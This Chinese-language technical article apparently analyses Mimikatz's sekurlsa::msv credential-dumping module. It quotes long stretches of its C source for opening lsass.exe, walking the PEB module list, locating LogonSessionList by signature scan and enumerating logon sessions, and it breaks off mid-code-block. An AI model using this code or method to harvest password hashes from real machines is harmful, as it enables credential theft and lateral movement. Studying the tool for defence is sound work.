Mimikatz 的 `sekurlsa::msv` 功能可以在线从当前主机的 lsass.exe 进程中枚举哈希（LM &amp; NTLM）凭据。

TL;DR
=====

当 Windows 系统启动时，lsasrv.dll 会被加载到 lsass.exe 进程中用于本地安全密码验证，该模块中的 `LogonSessionList` 和 `LogonSessionListCount` 两个全局变量分别用于存储当前活动的 Windows 登录会话标识符和会话数。

Mimikatz 的 `msv` 模块的原理便是首先从 lsass.exe 进程中计算出加载的 lsasrv.dll 模块的基地址，然后在该模块中定位两个全局变量，最后从 `LogonSessionList` 中解密用户凭据。至于如何找这两个变量，Mimikatz 采用了签名扫描的方法。由于两个变量都是全局变量，因此它们可以利用某些不变的签名内存作为特征码来识别引用这些全局变量的指令。

例如在 Windows 10 x64 1903 系统中，Mimikatz 扫描下图红色边框标出的特征码，以识别 `mov r9d, cs:?LogonSessionListCount` 和 `lea rcx, ?LogonSessionList` 指令。在 x86\_64 架构上，这些指令使用 `rip` 相对寻址来访问和使用全局变量，下图中的蓝色和绿色边框标出的字节序列，即为指令所保存的 `LogonSessionList` 和 `LogonSessionListCount` 相对于当前指令的偏移量（小端序）。

![image-20221218113509901](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-70530314d9fb02a872a417ef01afddba17e510d3.png)

下面给出更深入的解释：

- 签名：上图中红色边框标出的字节序列，这一段字节序列在同一版本系统中不变，因此可以用来识别 `mov r9d, cs:?LogonSessionListCount` 和 `lea rcx, ?LogonSessionList` 指令。
- LogonSessionList：在 x86\_64 架构上，可以引用相对于指令指针当前值的地址。绿色边框标出的四个字节前的三个字节标记了 `lea rsi` 指令，边框内的四个字节保存了 `LogonSessionList` 变量相对于 `rip` 指令的偏移量。此时 `rip` 指向的地址为绿色边框结束的地址。
- LogonSessionListCount：同理，`LogonSessionListCount` 变量的偏移量由蓝色边框标记出。此时 `rip` 指向的地址为蓝色边框结束的地址。

在这个例子中，Mimikatz先扫描出特征码的地址是 `0x18006D4A4`，然后加上 23 个字节定位到保存 `LogonSessionList` 变量的地址，取出偏移量为 `0x119DC1`，因此可以计算出 `LogonSessionList` 变量的地址为 `0x18006D4A4 + Hex(23) + Hex(4) + 0x119DC1 = 0x180187280`，如下图所示位置，可以看到 `LogonSessionList` 是一个 `LIST_ENTRY` 结构体，该结构会在下文中讲到。

![image-20221218113813825](https://shs3.b.qianxin.com/attack_forum/2023/04/attach-01040673daa16e47998bb75f4469222fd5ad304d.png)

同理可以算出 `LogonSessionListCount` 变量的地址。

Beginning
=========

Make Lsass Packages
-------------------

根据 `msv` 功能的名称找到其入口函数 `kuhl_m_sekurlsa_msv()`：

- sekurlsa\\packages\\kuhl\_m\_sekurlsa\_msv1\_0.c

```c++
NTSTATUS kuhl_m_sekurlsa_msv(int argc, wchar_t * argv[])
{
    return kuhl_m_sekurlsa_getLogonData(kuhl_m_sekurlsa_msv_single_package, 1);
}
```

这里的 `kuhl_m_sekurlsa_msv_single_package` 是包含了本模块所使用的 lsass 包：

```c++
KUHL_M_SEKURLSA_PACKAGE kuhl_m_sekurlsa_msv_package = {L"msv", kuhl_m_sekurlsa_enum_logon_callback_msv, TRUE, L"lsasrv.dll", {{{NULL, NULL}, 0, 0, NULL}, FALSE, FALSE}};
```

这是一个 `KUHL_M_SEKURLSA_PACKAGE` 结构体，用于存放功能名、回调函数、需要找的进程模块等信息：

```c++
typedef struct _KUHL_M_SEKURLSA_PACKAGE {
    const wchar_t * Name;
    PKUHL_M_SEKURLSA_ENUM_LOGONDATA CredsForLUIDFunc;
    BOOL isValid;
    const wchar_t * ModuleName;
    KUHL_M_SEKURLSA_LIB Module;
} KUHL_M_SEKURLSA_PACKAGE, *PKUHL_M_SEKURLSA_PACKAGE;
```

随后调用 `kuhl_m_sekurlsa_getLogonData()` 函数获取用户的登录信息，该函数后紧接着一系列复杂的调用过程。

Get Logon Data
--------------

跟进 `kuhl_m_sekurlsa_getLogonData()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
NTSTATUS kuhl_m_sekurlsa_getLogonData(const PKUHL_M_SEKURLSA_PACKAGE * lsassPackages, ULONG nbPackages)
{
    KUHL_M_SEKURLSA_GET_LOGON_DATA_CALLBACK_DATA OptionalData = {lsassPackages, nbPackages};
    return kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_logondata, &amp;OptionalData);
}
```

这里将传进来的 lsass 包组成 `OptionalData` 后传入 `kuhl_m_sekurlsa_enum()` 函数。

Main Enumeration Function
-------------------------

跟进 `kuhl_m_sekurlsa_enum()` 函数，该函数是主要的枚举函数，枚举包括 lsass.exe 进程、用户会话在内的相关信息。

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
NTSTATUS kuhl_m_sekurlsa_enum(PKUHL_M_SEKURLSA_ENUM callback, LPVOID pOptionalData)
{
    KIWI_BASIC_SECURITY_LOGON_SESSION_DATA sessionData;
    ULONG nbListes = 1, i;
    PVOID pStruct;
    KULL_M_MEMORY_ADDRESS securityStruct, data = {&amp;nbListes, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE}, aBuffer = {NULL, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    BOOL retCallback = TRUE;
    const KUHL_M_SEKURLSA_ENUM_HELPER * helper;
    // 调用 kuhl_m_sekurlsa_acquireLSA() 函数提取 lsass.exe 进程信息
    NTSTATUS status = kuhl_m_sekurlsa_acquireLSA();

    if(NT_SUCCESS(status))
    {
        sessionData.cLsass = &amp;cLsass;
        sessionData.lsassLocalHelper = lsassLocalHelper;
        // 判断当前 Windows 系统的版本信息
        if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_2K3)
            helper = &amp;lsassEnumHelpers[0];
        else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_VISTA)
            helper = &amp;lsassEnumHelpers[1];
        else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_7)
            helper = &amp;lsassEnumHelpers[2];
        else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_8)
            helper = &amp;lsassEnumHelpers[3];
        else if(cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_BLUE)
            helper = &amp;lsassEnumHelpers[5];
        else
            helper = &amp;lsassEnumHelpers[6];

        if((cLsass.osContext.BuildNumber &gt;= KULL_M_WIN_MIN_BUILD_7) &amp;&amp; (cLsass.osContext.BuildNumber &lt; KULL_M_WIN_MIN_BUILD_BLUE) &amp;&amp; (kuhl_m_sekurlsa_msv_package.Module.Informations.TimeDateStamp &gt; 0x53480000))
            helper++; // yeah, really, I do that =)

        securityStruct.hMemory = cLsass.hLsassMem;
        if(securityStruct.address = LogonSessionListCount)
            kull_m_memory_copy(&amp;data, &amp;securityStruct, sizeof(ULONG));

        for(i = 0; i &lt; nbListes; i++)
        {
            securityStruct.address = &amp;LogonSessionList[i];
            data.address = &amp;pStruct;
            data.hMemory = &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE;
            if(aBuffer.address = LocalAlloc(LPTR, helper-&gt;tailleStruct))
            {
                if(kull_m_memory_copy(&amp;data, &amp;securityStruct, sizeof(PVOID)))
                {
                    data.address = pStruct;
                    data.hMemory = securityStruct.hMemory;

                    while((data.address != securityStruct.address) &amp;&amp; retCallback)
                    {
                        if(kull_m_memory_copy(&amp;aBuffer, &amp;data, helper-&gt;tailleStruct))
                        {
                            sessionData.LogonId     = (PLUID)           ((PBYTE) aBuffer.address + helper-&gt;offsetToLuid);
                            sessionData.LogonType   = *((PULONG)        ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonType));
                            sessionData.Session     = *((PULONG)        ((PBYTE) aBuffer.address + helper-&gt;offsetToSession));
                            sessionData.UserName    = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToUsername);
                            sessionData.LogonDomain = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToDomain);
                            sessionData.pCredentials= *(PVOID *)        ((PBYTE) aBuffer.address + helper-&gt;offsetToCredentials);
                            sessionData.pSid        = *(PSID *)         ((PBYTE) aBuffer.address + helper-&gt;offsetToPSid);
                            sessionData.pCredentialManager = *(PVOID *) ((PBYTE) aBuffer.address + helper-&gt;offsetToCredentialManager);
                            sessionData.LogonTime   = *((PFILETIME)     ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonTime));
                            sessionData.LogonServer = (PUNICODE_STRING) ((PBYTE) aBuffer.address + helper-&gt;offsetToLogonServer);

                            kull_m_process_getUnicodeString(sessionData.UserName, cLsass.hLsassMem);
                            kull_m_process_getUnicodeString(sessionData.LogonDomain, cLsass.hLsassMem);
                            kull_m_process_getUnicodeString(sessionData.LogonServer, cLsass.hLsassMem);
                            kull_m_process_getSid(&amp;sessionData.pSid, cLsass.hLsassMem);

                            retCallback = callback(&amp;sessionData, pOptionalData);

                            if(sessionData.UserName-&gt;Buffer)
                                LocalFree(sessionData.UserName-&gt;Buffer);
                            if(sessionData.LogonDomain-&gt;Buffer)
                                LocalFree(sessionData.LogonDomain-&gt;Buffer);
                            if(sessionData.LogonServer-&gt;Buffer)
                                LocalFree(sessionData.LogonServer-&gt;Buffer);
                            if(sessionData.pSid)
                                LocalFree(sessionData.pSid);

                            data.address = ((PLIST_ENTRY) (aBuffer.address))-&gt;Flink;
                        }
                        else break;
                    }
                }
                LocalFree(aBuffer.address);
            }
        }
    }
    return status;
}
```

可以看到，首先会调用 `kuhl_m_sekurlsa_acquireLSA()` 函数，该函数的作用是提取 lsass.exe 的进程信息。

Extract LSA Information
=======================

跟进 `kuhl_m_sekurlsa_acquireLSA()` 函数：

- sekurlsa\\kuhl\_m\_sekurlsa.c

```c++
NTSTATUS kuhl_m_sekurlsa_acquireLSA()
{
    NTSTATUS status = STATUS_SUCCESS;
    KULL_M_MEMORY_TYPE Type;
    HANDLE hData = NULL;
    DWORD pid, cbSk;
    PMINIDUMP_SYSTEM_INFO pInfos;
    DWORD processRights = PROCESS_VM_READ | ((MIMIKATZ_NT_MAJOR_VERSION &lt; 6) ? PROCESS_QUERY_INFORMATION : PROCESS_QUERY_LIMITED_INFORMATION);
    BOOL isError = FALSE;
    PBYTE pSk;

    // 
    if(!cLsass.hLsassMem)
    {
        status = STATUS_NOT_FOUND;
        if(pMinidumpName)
        {
            Type = KULL_M_MEMORY_TYPE_PROCESS_DMP;
            kprintf(L"Opening : \'%s\' file for minidump...\n", pMinidumpName);
            hData = CreateFile(pMinidumpName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
        }
        else
        {
            Type = KULL_M_MEMORY_TYPE_PROCESS;
            // 获取 lsass.exe 进程的 PID
            if(kull_m_process_getProcessIdForName(L"lsass.exe", &amp;pid))
                // 打开 lsass.exe 进程的句柄
                hData = OpenProcess(processRights, FALSE, pid);
            else PRINT_ERROR(L"LSASS process not found (?)\n");
        }

        if(hData &amp;&amp; hData != INVALID_HANDLE_VALUE)
        {
            if(kull_m_memory_open(Type, hData, &amp;cLsass.hLsassMem))
            {
                if(Type == KULL_M_MEMORY_TYPE_PROCESS_DMP)
                {
                    // ......
                }
                else
                {
                #if defined(_M_IX86)
                    if(IsWow64Process(GetCurrentProcess(), &amp;isError) &amp;&amp; isError)
                        PRINT_ERROR(MIMIKATZ L" " MIMIKATZ_ARCH L" cannot access x64 process\n");
                    else
                #endif
                    {   
                        // 设置 KUHL_M_SEKURLSA_OS_CONTEXT（osContext）结构中的三个值
                        cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
                        cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
                        cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
                    }
                }

                if(!isError)
                {
                    lsassLocalHelper = 
                    #if defined(_M_ARM64)
                        &amp;lsassLocalHelpers[0]
                    #else
                        (cLsass.osContext.MajorVersion &lt; 6) ? &amp;lsassLocalHelpers[0] : &amp;lsassLocalHelpers[1]
                    #endif
                    ;

                    if(NT_SUCCESS(lsassLocalHelper-&gt;initLocalLib()))
                    {
                    #if !defined(_M_ARM64)
                        kuhl_m_sekurlsa_livessp_package.isValid = (cLsass.osContext.BuildNumber &gt;= KULL_M_WIN_MIN_BUILD_8);
                    #endif
                        kuhl_m_sekurlsa_tspkg_package.isValid = (cLsass.osContext.MajorVersion &gt;= 6) || (cLsass.osContext.MinorVersion &lt; 2);
                        kuhl_m_sekurlsa_cloudap_package.isValid = (cLsass.osContext.BuildNumber &gt;= KULL_M_WIN_BUILD_10_1909);
                        if(NT_SUCCESS(kull_m_process_getVeryBasicModuleInformations(cLsass.hLsassMem, kuhl_m_sekurlsa_findlibs, NULL)) &amp;&amp; kuhl_m_sekurlsa_msv_package.Module.isPresent)
                        {
                            kuhl_m_sekurlsa_dpapi_lsa_package.Module = kuhl_m_sekurlsa_msv_package.Module;
                            if(kuhl_m_sekurlsa_utils_search(&amp;cLsass, &amp;kuhl_m_sekurlsa_msv_package.Module))
                            {
                                status = lsassLocalHelper-&gt;AcquireKeys(&amp;cLsass, &amp;lsassPackages[0]-&gt;Module.Informations);
                                if(!NT_SUCCESS(status))
                                    PRINT_ERROR(L"Key import\n");
                            }
                            else PRINT_ERROR(L"Logon list\n");
                        }
                        else PRINT_ERROR(L"Modules informations\n");
                    }
                    else PRINT_ERROR(L"Local LSA library failed\n");
                }
            }
            else PRINT_ERROR(L"Memory opening\n");

            if(!NT_SUCCESS(status))
                CloseHandle(hData);
        }
        else PRINT_ERROR_AUTO(L"Handle on memory");

        if(!NT_SUCCESS(status))
            cLsass.hLsassMem = kull_m_memory_close(cLsass.hLsassMem);
    }
    return status;
}
```

由于 `pMinidumpName` 初始值为 NULL，因此会通过 `kull_m_process_getProcessIdForName` 和 `OpenProcess` 两个函数获取 lsass.exe 进程的 PID，并创建一个进程的句柄 `hData`。然后调用 `kull_m_memory_open()` 函数。

Initialize LSA Context
----------------------

`kull_m_memory_open()` 函数传入的第三个参数为 `&amp;cLsass.hLsassMem`，其中 `cLsass` 是一个 `KUHL_M_SEKURLSA_CONTEXT` 结构体，如下所示。

```c++
typedef struct _KUHL_M_SEKURLSA_CONTEXT {
    PKULL_M_MEMORY_HANDLE hLsassMem;
    KUHL_M_SEKURLSA_OS_CONTEXT osContext;
} KUHL_M_SEKURLSA_CONTEXT, *PKUHL_M_SEKURLSA_CONTEXT;
```

hLsassMem 用于存储进程的句柄等有关信息，其结构如下，在 MSV 功能种只用到了其中的 `pHandleProcess`：

```c++
typedef struct _KULL_M_MEMORY_HANDLE {
    KULL_M_MEMORY_TYPE type;
    union {
        PKULL_M_MEMORY_HANDLE_PROCESS pHandleProcess;
        PKULL_M_MEMORY_HANDLE_FILE pHandleFile;
        PKULL_M_MEMORY_HANDLE_PROCESS_DMP pHandleProcessDmp;
        PKULL_M_MEMORY_HANDLE_KERNEL pHandleDriver;
    };
} KULL_M_MEMORY_HANDLE, *PKULL_M_MEMORY_HANDLE;
```

跟进 `kull_m_memory_open()` 函数，其作用就是为 `cLsass.hLsassMem` 结构里面的 `pHandleProcess` 开辟内存并设置 cLsass.hLsassMem.pHandleProcess-&gt;hProcess 为 lsass 进程的句柄。

- kull\_m\_memory.c

```c++
BOOL kull_m_memory_open(IN KULL_M_MEMORY_TYPE Type, IN HANDLE hAny, OUT PKULL_M_MEMORY_HANDLE *hMemory)
{
    BOOL status = FALSE;

    *hMemory = (PKULL_M_MEMORY_HANDLE) LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE));
    if(*hMemory)
    {
        (*hMemory)-&gt;type = Type;
        switch (Type)
        {
        case KULL_M_MEMORY_TYPE_OWN:
            // ......
        case KULL_M_MEMORY_TYPE_PROCESS:
            // 为 pHandleProcess 开辟内存
            if((*hMemory)-&gt;pHandleProcess = (PKULL_M_MEMORY_HANDLE_PROCESS) LocalAlloc(LPTR, sizeof(KULL_M_MEMORY_HANDLE_PROCESS)))
            {
                // 将 pHandleProcess-&gt;hProcess 赋值为 lsass 进程的句柄
                (*hMemory)-&gt;pHandleProcess-&gt;hProcess = hAny;
                status = TRUE;
            }
            break;
        case KULL_M_MEMORY_TYPE_FILE:
            // ......
        case KULL_M_MEMORY_TYPE_PROCESS_DMP:
            // ......
        case KULL_M_MEMORY_TYPE_KERNEL:
            // ......
        default:
            break;
        }
        if(!status)
            LocalFree(*hMemory);
    }
    return status;
}
```

回到 `kuhl_m_sekurlsa_acquireLSA()` 函数，设置将有关系统版本的信息复制到 `cLsass.osContext` 中：

```c++
// 设置 KUHL_M_SEKURLSA_OS_CONTEXT（osContext）结构中的三个值
 cLsass.osContext.MajorVersion = MIMIKATZ_NT_MAJOR_VERSION;
 cLsass.osContext.MinorVersion = MIMIKATZ_NT_MINOR_VERSION;
 cLsass.osContext.BuildNumber  = MIMIKATZ_NT_BUILD_NUMBER;
```

如果此时没有错误，则调用 `kull_m_process_getVeryBasicModuleInformations()` 函数获取 lsass.exe 进程的基础信息，主要用来获取加载的 lsasrv.dll 模块的基地址。

Get Very Basic Module Informations
----------------------------------

跟进 `kull_m_process_getVeryBasicModuleInformations()` 函数：

- kull\_m\_process.c

```c++
NTSTATUS kull_m_process_getVeryBasicModuleInformations(PKULL_M_MEMORY_HANDLE memory, PKULL_M_MODULE_ENUM_CALLBACK callBack, PVOID pvArg)
{
    NTSTATUS status = STATUS_DLL_NOT_FOUND;
    PLDR_DATA_TABLE_ENTRY pLdrEntry;
    PEB Peb; PEB_LDR_DATA LdrData; LDR_DATA_TABLE_ENTRY LdrEntry;
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
    // ...
#endif
    ULONG i;
    KULL_M_MEMORY_ADDRESS aBuffer = {NULL, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_ADDRESS aProcess= {NULL, memory};
    PBYTE aLire, fin;
    PWCHAR moduleNameW;
    UNICODE_STRING moduleName;
    PMINIDUMP_MODULE_LIST pMinidumpModuleList;
    PMINIDUMP_STRING pMinidumpString;
    KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION moduleInformation;
    PRTL_PROCESS_MODULES modules = NULL;
    BOOL continueCallback = TRUE;
    moduleInformation.DllBase.hMemory = memory;
    switch(memory-&gt;type)
    {
    case KULL_M_MEMORY_TYPE_OWN:
        // ......
    case KULL_M_MEMORY_TYPE_PROCESS:
        moduleInformation.NameDontUseOutsideCallback = &amp;moduleName;
        // 获取进程的 PEB 结构
        if(kull_m_process_peb(memory, &amp;Peb, FALSE))
        {
            aBuffer.address = &amp;LdrData; aProcess.address = Peb.Ldr;
            // 将 Peb.Ldr 指向的 PEB_LDR_DATA 结构复制到 LdrData 中
            if(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(LdrData)))
            {
                // 遍历所有 LDR_DATA_TABLE_ENTRY 结构
                for(
                    aLire  = (PBYTE) (LdrData.InMemoryOrderModulevector.Flink) - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks),
                    fin    = (PBYTE) (Peb.Ldr) + FIELD_OFFSET(PEB_LDR_DATA, InLoadOrderModulevector);
                    (aLire != fin) &amp;&amp; continueCallback;
                    aLire  = (PBYTE) LdrEntry.InMemoryOrderLinks.Flink - FIELD_OFFSET(LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks)
                    )
                {
                    // 将 aLire 指向的 LDR_DATA_TABLE_ENTRY 结构复制到 LdrEntry 中
                    aBuffer.address = &amp;LdrEntry; aProcess.address = aLire;
                    if(continueCallback = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, sizeof(LdrEntry)))
                    {
                        // 获取模块地址
                        moduleInformation.DllBase.address = LdrEntry.DllBase;
                        // 获取模块映像大小
                        moduleInformation.SizeOfImage = LdrEntry.SizeOfImage;
                        // 获取模块映像名称
                        moduleName = LdrEntry.BaseDllName;
                        // BaseDllName.Buffer 中保存了模块映像名称字符串
                        if(moduleName.Buffer = (PWSTR) LocalAlloc(LPTR, moduleName.MaximumLength))
                        {
                            aBuffer.address = moduleName.Buffer; aProcess.address = LdrEntry.BaseDllName.Buffer;
                            if(kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, moduleName.MaximumLength))
                            {
                                kull_m_process_adjustTimeDateStamp(&amp;moduleInformation);
                                continueCallback = callBack(&amp;moduleInformation, pvArg);
                            }
                            LocalFree(moduleName.Buffer);
                        }
                    }
                }
                status = STATUS_SUCCESS;
            }
        }
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
        // ......
#endif
        break;

    case KULL_M_MEMORY_TYPE_PROCESS_DMP:
        // ......
    case KULL_M_MEMORY_TYPE_KERNEL:
        // ......
    default:
        status = STATUS_NOT_IMPLEMENTED;
        break;
    }

    return status;
}
```

在 `kull_m_process_getVeryBasicModuleInformations()` 函数内部，将调用 `kull_m_process_peb()` 函数，用于获取 lsass.exe 进程的 PEB 结构。

### Get PEB Structure

跟进 `kull_m_process_peb()` 函数：

- kull\_m\_process.c

```c++
BOOL kull_m_process_peb(PKULL_M_MEMORY_HANDLE memory, PPEB pPeb, BOOL isWOW)
{
    BOOL status = FALSE;
    PROCESS_BASIC_INFORMATION processInformations;
    HANDLE hProcess = (memory-&gt;type == KULL_M_MEMORY_TYPE_PROCESS) ? memory-&gt;pHandleProcess-&gt;hProcess : GetCurrentProcess();
    KULL_M_MEMORY_ADDRESS aBuffer = {pPeb, &amp;KULL_M_MEMORY_GLOBAL_OWN_HANDLE};
    KULL_M_MEMORY_ADDRESS aProcess= {NULL, memory};
    PROCESSINFOCLASS info;
    ULONG szPeb, szBuffer, szInfos;
    LPVOID buffer;

#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
    if(isWOW)
    {
        info = ProcessWow64Information;
        szBuffer = sizeof(processInformations.PebBaseAddress);
        buffer = &amp;processInformations.PebBaseAddress;
        szPeb = sizeof(PEB_F32);
    }
    else
    {
#endif
        info = ProcessBasicInformation;
        szBuffer = sizeof(processInformations);
        buffer = &amp;processInformations;
        szPeb = sizeof(PEB);
#if defined(_M_X64) || defined(_M_ARM64) // TODO:ARM64
    }
#endif

    switch(memory-&gt;type)
    {
#if !defined(MIMIKATZ_W2000_SUPPORT)
    case KULL_M_MEMORY_TYPE_OWN:
        if(!isWOW)
        {
            *pPeb = *RtlGetCurrentPeb();
            status = TRUE;
            break;
        }
#endif
    case KULL_M_MEMORY_TYPE_PROCESS:
        // 通过 NtQueryInformationProcess 函数获取 lsass.exe 进程的信息，并将其写入 buffer 中
        if(NT_SUCCESS(NtQueryInformationProcess(hProcess, info, buffer, szBuffer, &amp;szInfos)) &amp;&amp; (szInfos == szBuffer) &amp;&amp; processInformations.PebBaseAddress)
        {
            aProcess.address = processInformations.PebBaseAddress;
            status = kull_m_memory_copy(&amp;aBuffer, &amp;aProcess, szPeb);
        }
        break;
    }
    return status;
}
```

`kull_m_process_peb()` 函数将通过 `NtQueryInformationProcess()` 函数检索 lsass.exe 进程的信息，并将其写入 `buffer` 中。由于 `buffer` 是指向 `processInformations` 的指针，因此检索到的信息最终将由 `processInformations` 接收，这是一个 `PROCESS_BASIC_INFORMATION` 结构体，其声明如下。

```c++
typedef struct _PROCESS_BASIC_INFORMATION {
    NTSTATUS ExitStatus;
    PPEB PebBaseAddress;
    ULONG_PTR AffinityMask;
    KPRIORITY BasePriority;
    ULONG_PTR UniqueProcessId;
    ULONG_PTR InheritedFromUniqueProcessId;
} PROCESS_BASIC_INFORMATION,*PPROCESS_BASIC_INFORMATION;
```

其中 `PebBaseAddress` 是指向进程 PEB 结构的指针。

获取到 `PebBaseAddress` 后，将其赋给 `aProcess.address`，`aProcess` 和 `aBuffer` 都是 `KULL_M_MEMORY_ADDRESS` 结构体，其声明如下。

```c++
typedef struct _KULL_M_MEMORY_ADDRESS {
    LPVOID address;
    PKULL_M_MEMORY_HANDLE hMemory;
} KULL_M_MEMORY_ADDRESS, *PKULL_M_MEMORY_ADDRESS;
```

接下来会调用 `kull_m_memory_copy()` 函数，通过 `ReadProcessMemory()` 函数将 `aProcess.address` 指向的 PEB 结构的内存读取到 `aBuffer.address` 指向的内存空间中，最终 `pPeb` 成为指向 PEB 结构的指针。在后续的过程中，这种内存复制的方法会经常出现。

获取到 PEB 结构后，返回 `kull_m_process_getVeryBasicModuleInformations()` 函数。

#### Process Envirorment Block Structure（PEB）

Process Envirorment Block Structure（PEB）即进程环境信息块，Windows 系统的每个运行的进程都维护着一个 PEB 数据块，其中包含适用于整个进程的数据结构，存储着全局上下文、启动参数、加载的模块等信息。

```c++
typedef struct _PEB {
  BYTE                          Reserved1[2];
  BYTE                          BeingDebugged;
  BYTE                          Reserved2[1];
  PVOID                         Reserved3[2];
  PPEB_LDR_DATA                 Ldr;
  PRTL_USER_PROCESS_PARAMETERS  ProcessParameters;
  PVOID                         Reserved4[3];
  PVOID                         AtlThunkSListPtr;
  PVOID                         Reserved5;
  ULONG                         Reserved6;
  PVOID                         Reserved7;
  ULONG                         Reserved8;
  ULONG                         AtlThunkSListPtr32;
  PVOID                         Reserved9[45];
  BYTE                          Reserved10[96];
  PPS_POST_PROCESS_INIT_ROUTINE PostProcessInitRoutine;
  BYTE                          Reserved11[128];
  PVOID                         Reserved12[1];
  ULONG                         SessionId;
} PEB, *PPEB;
```

在 PEB 结构中有一个指向 `PEB_LDR_DATA` 结构体的指针 `Ldr`，该结构中记录着进程已加载模块的信息，其声明如下。

```c++
typedef struct _PEB_LDR_DATA
{
     ULONG Length;
     UCHAR Initialized;
     PVOID SsHandle;
     LIST_ENTRY InLoadOrderModuleList;              // 在 Mimikatz 中是 InLoadOrderModulevector
     LIST_ENTRY InMemoryOrderModuleList;            // 在 Mimikatz 中是 InMemoryOrderModulevector
     LIST_ENTRY InInitializationOrderModuleList;    // 在 Mimikatz 中是 InInitializationOrderModulevector
     PVOID EntryInProgress;
} PEB_LDR_DATA, *PPEB_LDR_DATA;
```

在 PEB\_LDR\_DATA 结构体中提供了三个链表 `InMemoryOrderModuleList`、`InMemoryOrderModuleList` 和 `InInitializationOrderModuleList`，链表内的节点都是一样的，只是排序不同。每个链表都是 `LIST_ENTRY` 结构体，其声明如下。

```c++
typedef struct _LIST_ENTRY
{
     PLIST_ENTRY Flink;
     PLIST_ENTRY Blink;
} LIST_ENTRY, *PLIST_ENTRY;
```

可以看到这个结构有两个成员，成员 `Flink` 指向下一个节点，`Blink` 指向上一个节点，所以这是一个双向链表。

当我们从 `PEB_LDR_DATA` 结构中取到任何一个 `LIST_ENTRY` 结构时，这个结构中的 `Flink` 链接到真正的模块链表，这个真正的链表的每个成员都是一个 `LDR_DATA_TABLE_ENTRY` 结构，其结构声明如下。

```c++
typedef struct _LDR_DATA_TABLE_ENTRY
{
     LIST_ENTRY InLoadOrderLinks;
     LIST_ENTRY InMemoryOrderLinks;
     LIST_ENTRY InInitializationOrderLinks;
     PVOID DllBase;
     PVOID EntryPoint;
     ULONG SizeOfImage;
     UNICODE_STRING FullDllName;
     UNICODE_STRING BaseDllName;
     ULONG Flags;
     WORD LoadCount;
     WORD TlsIndex;
     union
     {
          LIST_ENTRY HashLinks;
          struct
          {
               PVOID SectionPointer;
               ULONG CheckSum;
          };
     };
     union
     {
          ULONG TimeDateStamp;
          PVOID LoadedImports;
     };
     _ACTIVATION_CONTEXT * EntryPointActivationContext;
     PVOID PatchInformation;
     LIST_ENTRY ForwarderLinks;
     LIST_ENTRY ServiceTagLinks;
     LIST_ENTRY StaticLinks;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;
```

可以看到，该结构保存了进程已加载模块的信息。并且也有三个 `LIST_ENTRY` 结构的链表 `InLoadOrderLinks`、`InMemoryOrderLinks` 和 `InInitializationOrderLinks`，他们分别对应下一个或上一个 `LDR_DATA_TABLE_ENTRY` 节点中的 `LIST_ENTRY` 结构。

以 `InMemoryOrderModuleList\InMemoryOrderLinks` 为例，也就是说：

- 第一个 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 中的 `Flink` 指向第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 中的 `Blink` 指向最后一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向第二个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 的首地址。
- 第一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Blink` 指向 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 的首地址。
- 最后一个 `LDR_DATA_TABLE_ENTRY` 结构中 `InMemoryOrderLinks` 中的 `Flink` 指向 `PEB_LDR_DATA` 结构中 `InMemoryOrderModuleList` 的首地址。

最终可以构建起一个以 `PEB_LDR_DATA` 为起点的一个闭合环形双向链表，这样就可以通过 PEB 遍历进程加载的所有模块了。

### Get Base Address Of Lsasrv.dll Module

成功获取 PEB 结构后，回到 `kull_m_process_getVeryBasicModuleInformations()` 函数，通过 `kull_m_memory_copy()` 函数将 `Peb.Ldr` 指向的 `PEB_LDR_DATA` 结构复制到 `LdrData` 中。然后遍历所有 `LDR_DATA_TABLE_ENTRY` 结构，分别获取模块地址、映像大小和映像名称，并把它们保存到 `moduleInformation` 中，这是了一个 `KULL_M_PROCESS_VERY_BASIC_MODULE_INFORMATION` 结构体，其声明如下，用于存储 lsasrv.dll 模块的有关信息。

```c++
